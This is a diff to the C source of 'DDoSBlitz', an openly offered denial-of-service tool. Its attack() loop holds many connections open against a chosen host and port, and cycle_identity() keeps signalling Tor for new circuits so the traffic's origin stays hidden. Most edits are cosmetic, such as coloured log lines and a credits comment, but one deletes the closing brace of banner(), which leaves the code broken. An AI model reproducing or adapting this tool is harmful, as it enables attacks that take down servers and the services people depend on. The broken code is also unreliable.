@@ -14,6 +14,7 @@
 #define THREADS 48
 
 void banner() {
+    system("clear");
     printf("\033[1;31m");
     printf(" @@@@@@@  @@@@@@@   @@@@@@   @@@@@@ @@@@@@@  @@@      @@@ @@@@@@@ @@@@@@@@\n");
     printf(" @@!  @@@ @@!  @@@ @@!  @@@ !@@     @@!  @@@ @@!      @@!   @@!        @@!\n");
@@ -23,7 +24,6 @@ void banner() {
     printf("                                                                           \n");
     printf("                          DDoSBlitz\n");
     printf("                           By - New71k\n");
-    printf("\033[41m\033[1;37m  Distributed Denial of Service - C Tools  \033[0m\n");
     printf("\033[1;33mAuthor   : \033[1;37mNew71k\033[0m\n");
     printf("\033[1;32mPress CTRL+C to stop sending\033[1;37m\n");
     printf("------------\n");
@@ -31,7 +31,6 @@ void banner() {
     printf("    \033[1;32m./DDoSBlitz <target> <port>\033[0m\n");
     printf("Example:\n");
     printf("    \033[1;32m./DDoSBlitz www.example.com 80\033[0m\n");
-}
 
 int make_socket(char *host, char *port) {
     struct addrinfo hints, *servinfo, *p;
@@ -61,13 +60,11 @@ int make_socket(char *host, char *port) {
     }
     if (servinfo)
         freeaddrinfo(servinfo);
-    fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+    fprintf(stderr, "\033[1;32m[Connected -> %s:%s]\033[0m\n", host, port);
     return sock;
 }
 
-void broke(int s) {
-    // do nothing
-}
+void broke(int s) {}
 
 void attack(char *host, char *port, int id) {
     int sockets[CONNECTIONS];
@@ -84,7 +81,7 @@ void attack(char *host, char *port, int id) {
                 close(sockets[x]);
                 sockets[x] = make_socket(host, port);
             } else {
-                fprintf(stderr, "[%i: %s DDoSBlitz Fucking the Server]\n", id, host);
+                fprintf(stderr, "\033[1;31m[%i: \033[1;36m%s\033[1;31m DDoSBlitz \033[1;35mFucking the Server\033[1;31m]\033[0m\n", id, host);
             }
         }
         usleep(300000);
@@ -97,7 +94,7 @@ void cycle_identity() {
     write(socket, "AUTHENTICATE \"\"\n", 16);
     while (1) {
         r = write(socket, "signal NEWNYM\n\x00", 16);
-        fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM]\n", r);
+        fprintf(stderr, "\033[1;33m[%i: cycle_identity -> signal NEWNYM]\033[0m\n", r);
         usleep(300000);
     }
 }
@@ -120,3 +117,4 @@ int main(int argc, char **argv) {
     }
     return 0;
 }
+/* Credits: New71k */
